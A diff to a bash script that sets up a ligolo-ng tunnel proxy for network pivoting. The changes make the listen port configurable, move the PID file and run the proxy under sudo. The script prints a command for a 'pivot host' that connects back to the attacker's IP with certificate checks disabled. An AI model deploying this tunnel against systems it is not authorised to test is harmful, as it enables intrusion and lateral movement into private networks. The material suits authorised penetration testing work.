@@ -9,7 +9,7 @@
 set -uo pipefail
 
 TUN_NAME="ligolo"
-PID_FILE="/tmp/.ligolo-setup-proxy.pid"
+PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-proxy.pid"
 
 if [[ "${1:-}" == "--teardown" ]]; then
     echo "[*] Tearing down ligolo-ng TUN interface and proxy."
@@ -47,7 +47,7 @@ if ip link show "$TUN_NAME" >/dev/null 2>&1; then
     echo "[*] TUN interface '$TUN_NAME' already exists -- skipping creation."
 else
     echo "[*] Creating TUN device '$TUN_NAME'"
-    sudo ip tuntap add user "$(whoami)" mode tun "$TUN_NAME" && sudo ip link set "$TUN_NAME" up
+    sudo ip tuntap add dev "$TUN_NAME" mode tun user "$(whoami)" && sudo ip link set "$TUN_NAME" up
 fi
 
 ATTACKER_IP="$(ip route get 1.1.1.1 2>/dev/null | grep -oP '(?<=src )\S+')"
@@ -60,7 +60,7 @@ echo
 echo "=================================================================="
 echo "Once the proxy below is listening, paste this on the PIVOT HOST:"
 echo
-echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:443 -ignore-cert -retry"
+echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT:-11601} -ignore-cert -retry"
 echo
 echo "Then, in the proxy console that starts below:"
 echo "  session                 # list/select the connected agent"
@@ -78,5 +78,7 @@ echo "second TUN interface (edit TUN_NAME at the top of this script) for the sec
 echo "=================================================================="
 echo
 echo "[*] Starting proxy in the foreground -- Ctrl+C to stop (run '$0 --teardown' after)."
+LISTEN_PORT="${LIGOLO_PORT:-11601}"
 echo "$$" > "$PID_FILE"
-exec "$PROXY_BIN" -selfcert -laddr 0.0.0.0:443
+echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry" >&2
+exec sudo "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LISTEN_PORT}"
